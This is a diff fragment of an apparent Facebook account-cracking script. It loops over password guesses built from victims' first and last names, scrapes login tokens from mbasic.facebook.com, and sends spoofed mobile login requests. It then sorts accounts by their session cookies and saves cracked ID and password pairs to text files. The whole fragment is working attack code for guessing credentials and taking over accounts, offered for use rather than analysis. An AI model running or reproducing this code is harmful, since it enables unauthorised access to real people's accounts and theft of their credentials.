+			"li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
+			"try_number":"0",
+			"unrecognized_tries":"0",
+			"email":ids,
+			"pass":pas,
+			"login":"Log In"}
+			header_freefb = {'authority':'mbasic.facebook.com',
+			'method': 'GET',
+			'scheme': 'https',
+			'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
+            'accept-language': 'en-US,en;q=0.9',
+            'cache-control': 'max-age=0',
+            'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
+            'sec-ch-ua-mobile': '?1',
+            'sec-ch-ua-platform': '"Android"',
+            'sec-fetch-dest': 'document',
+            'sec-fetch-mode': 'navigate',
+            'sec-fetch-site': 'none',
+            'sec-fetch-user': '?1',
+            'upgrade-insecure-requests': '1',
+ 		   'user-agent': 'Mozilla/5.0 (Linux; U; Android 7.1.1; zh-cn; OPPO A73 Build/N6F26Q) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.134 Mobile Safari/537.36 OppoBrowser/4.7.9',}
+			lo = session.post('https://mbasic.facebook.com/login/device-based/regular/login/?refsrc=deprecated&amp;lwv=100&amp;refid=8',data=log_data,headers=header_freefb).text
+			log_cookies=session.cookies.get_dict().keys()
+			if 'c_user' in log_cookies:
+				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
+				uid = coki[7:22]
+				if uid in oks:pass
+				else:
+					if 'checkpoint' in str(lo):
+						print('\r\r\033[1;34m [GS XD-2F] '+ids+' | '+pas)
+					else:
+						print(f'\r\x1b[1;32m [GS XD-OK] '+ids+' | '+pas)
+						cek_apk(session,coki)
+						open('/sdcard/GS XD-OK.txt', 'a').write(ids+'|'+pas+'\n')
+						oks.append(uid)
+						break
+			elif 'checkpoint' in log_cookies:
+				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
+				uid = coki[24:39]
+				if uid in cps:pass
+				else:
 					print('\r\r\x1b[38;5;208m [GS XD-CP] '+ids+' | '+pas+'\033[1;97m')
 					open('/sdcard/GS XD-CP.txt', 'a').write(ids+'|'+pas+'\n')
 					cps.append(ids)
 					break
-				else:
-					break
 			else:
 				continue
-	except requests.exceptions.ConnectionError:
-		time.sleep(20)
-	loop+=1
+		loop+=1
+	
+		time.sleep(10)
+	except:
+		pass
 		
 def ffb6(ids,names,passlist):
-	global loop,oks,cps
-	sys.stdout.write('\r\r\033[1;32m [GS XD ᗙ] %s|\033[1;32mOK:-%s \033[1;32m'%(loop,len(oks)));sys.stdout.flush()
-	session = requests.Session()
+	global loop
+	global oks
 	try:
-		first = names.split(' ')[0]
-		try:
-			last = names.split(' ')[1]
-		except:
-			last = 'Khan'
-		ps = first.lower()
-		ps2 = last.lower()
-		for fikr in passlist:
-			pas = fikr.replace('First',first).replace('Last',last).replace('first',ps).replace('last',ps2)
-			ua=random.choice(ugen)
-			head = {'Host': 'www.facebook.com',
-'viewport-width': '980',
- 'sec-ch-ua': '"Google Chrome";v="107", "Chromium";v="107", "Not=A?Brand";v="24"',
- 'sec-ch-ua-mobile': '?0',
- 'sec-ch-ua-platform': '"Windows"',
- 'sec-ch-prefers-color-scheme': 'light',
- 'dnt': '1', 
- 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9',
- 'upgrade-insecure-requests': '1', 
- 'user-agent': ua, 
- 'sec-fetch-site': 'none',
- 'sec-fetch-mode': 'navigate',
- 'sec-fetch-user': '?1', 
- 'sec-fetch-dest': 'document',
- 'accept-encoding': 'gzip, deflate, br',
- 'accept-language': 'en-US,en;q=0.9',}
-			getlog = session.get(f'https://www.facebook.com/login/device-based/password/?uid={ids}&flow=login_no_pin&refsrc=deprecated&_rdr')
-			idpass ={"lsd":re.search('name="lsd" value="(.*?)"', str(getlog.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(getlog.text)).group(1),"uid":ids,"next":"https://p.facebook.com/login/save-device/","flow":"login_no_pin","pass":pas,}
-			complete = session.post('https://www.facebook.com/login/device-based/validate-password/?shbl=0',data=idpass,allow_redirects=False,headers=head)
-			AXI=session.cookies.get_dict().keys()
-			if "c_user" in AXI:
-				coki=session.cookies.get_dict()
-				kuki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
-				print('\r\r\033[1;32m [GS XD-OK] %s | %s'%(ids,pas))
-				open('/sdcard/GS XD-OK.txt', 'a').write(ids+'|'+pas+'\n')
-				oks.append(ids)
-				break
-			elif 'checkpoint' in AXI:
-				if 'y' in pcp:
+		for pas in passlist:
+			sys.stdout.write('\r\r\033[1;32m [GS XD ᗙ] %s|\033[1;32mOK:-%s \033[1;91m'%(loop,len(oks)));sys.stdout.flush()
+			session = requests.Session()
+			pro = random.choice(ugen)
+			free_fb = session.get('https://mbasic.facebook.com').text
+			log_data = {
+				"lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
+			"jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
+			"m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
+			"li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
+			"try_number":"0",
+			"unrecognized_tries":"0",
+			"email":ids,
+			"pass":pas,
+			"login":"Log In"}
+			header_freefb = {'authority':'mbasic.facebook.com',
+			'method': 'GET',
+			'scheme': 'https',
+			'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
+            'accept-language': 'en-US,en;q=0.9',
+            'cache-control': 'max-age=0',
+            'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
+            'sec-ch-ua-mobile': '?1',
+            'sec-ch-ua-platform': '"Android"',
+            'sec-fetch-dest': 'document',
+            'sec-fetch-mode': 'navigate',
+            'sec-fetch-site': 'none',
+            'sec-fetch-user': '?1',
+            'upgrade-insecure-requests': '1',
+ 		   'user-agent': 'Mozilla/5.0 (Linux; Android 7.0; Infinix HOT 4 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36',}
+			lo = session.post('https://mbasic.facebook.com/login/device-based/regular/login/?refsrc=deprecated&amp;lwv=100&amp;refid=8',data=log_data,headers=header_freefb).text
+			log_cookies=session.cookies.get_dict().keys()
+			if 'c_user' in log_cookies:
+				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
+				uid = coki[7:22]
+				if uid in oks:pass
+				else:
+					if 'checkpoint' in str(lo):
+						print('\r\r\033[1;34m [GS XD-2F] '+ids+' | '+pas)
+					else:
+						print(f'\r\x1b[1;32m [GS XD-OK] '+ids+' | '+pas)
+						cek_apk(session,coki)
+						open('/sdcard/GS XD-OK.txt', 'a').write(ids+'|'+pas+'\n')
+						oks.append(uid)
+						break
+			elif 'checkpoint' in log_cookies:
+				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
+				uid = coki[24:39]
+				if uid in cps:pass
+				else:
 					print('\r\r\x1b[38;5;208m [GS XD-CP] '+ids+' | '+pas+'\033[1;97m')
 					open('/sdcard/GS XD-CP.txt', 'a').write(ids+'|'+pas+'\n')
 					cps.append(ids)
 					break
-				else:
-					break
 			else:
 				continue
-	except requests.exceptions.ConnectionError:
-		time.sleep(20)
-	loop+=1
+		loop+=1
+	
+		time.sleep(10)
+	except:
+		pass
 		
 	
 def menu_apikey():
